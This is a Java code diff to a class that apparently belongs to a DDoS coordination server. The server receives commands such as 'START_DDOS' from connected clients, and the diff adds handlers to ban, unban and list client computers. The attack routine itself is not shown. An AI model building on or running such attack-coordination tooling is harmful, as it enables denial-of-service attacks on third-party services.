@@ -20,7 +20,7 @@ public class ClientCycle {
 	public void start(DDOSServer ddosServer, Server server, SocketPackage event)
 			throws ClassNotFoundException, IOException {
 		this.event = event;
-		while (!event.getConnection().isClosed()) {
+		while (!event.getConnection().isClosed() && !Thread.currentThread().isInterrupted()) {
 			DataPackage pkgIn = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
 			println("Package received: " + pkgIn.getMessage() + " (ID: " + pkgIn.getId() + ")");
 			if (pkgIn.getMessage().equals("START_DDOS")) {
@@ -137,8 +137,37 @@ public class ClientCycle {
 
 				event.getOutputStream().writeObject(
 						new DataPackage(computers.toArray(new Computer[computers.size()])).setMessage("ALL_CLIENTS"));
+			} else if (pkgIn.getMessage().equals("BAN_COMPUTER")) {
+				Computer toBan = new Computer((SocketAddress) pkgIn.getObjects()[0],
+						(boolean) server.getClient((SocketAddress) pkgIn.getObjects()[0]).getExtraData()[0]);
+
+				event.getOutputStream()
+						.writeObject(new DataPackage(ddosServer.isBanned(toBan)).setMessage("COMPUTER_BANNED_STATUS"));
+				if (ddosServer.isBanned(toBan))
+					continue;
+
+				if (server.getClient(toBan.getAddress()) != null) {
+					server.removeClient(toBan.getAddress());
+				}
+				ddosServer.ban(toBan);
+			} else if (pkgIn.getMessage().equals("UNBAN_COMPUTER")) {
+				Computer toUnban = new Computer((SocketAddress) pkgIn.getObjects()[0],
+						(boolean) server.getClient((SocketAddress) pkgIn.getObjects()[0]).getExtraData()[0]);
+				event.getOutputStream().writeObject(
+						new DataPackage(!ddosServer.isBanned(toUnban)).setMessage("COMPUTER_UNBANNED_STATUS"));
+
+				if (!ddosServer.isBanned(toUnban))
+					continue;
+
+				ddosServer.unban(new Computer((SocketAddress) pkgIn.getObjects()[0],
+						(boolean) server.getClient((SocketAddress) pkgIn.getObjects()[0]).getExtraData()[0]));
+			} else if (pkgIn.getMessage().equals("GET_BAN_LIST")) {
+				event.getOutputStream().writeObject(new DataPackage(ddosServer.getBanlist()).setMessage("BAN_LIST"));
+			} else {
+				System.out.println("No handling mechanism for package type: " + pkgIn.getMessage() + " (ID: "
+						+ pkgIn.getId() + ")");
 			}
-			
+
 			event.getOutputStream().reset();
 		}
 
